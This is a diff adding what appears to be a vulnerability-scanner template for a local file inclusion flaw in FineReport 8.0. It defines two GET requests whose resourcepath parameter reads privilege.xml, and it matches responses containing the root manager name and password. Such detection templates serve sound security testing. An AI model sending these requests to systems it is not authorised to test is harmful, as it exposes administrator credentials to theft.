@@ -1,0 +1,26 @@
+id: finereport-path-traversal
+name: FineReport 8.0 - Local File Inclusion
+severity: high
+confidence: tentative
+description: FIneReport  8.0 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- finereport
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+  matchers: &id001
+  - type: body
+    words:
+    - <rootManagerName>
+    - <rootManagerPassword>
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+  matchers: *id001
+  condition: and
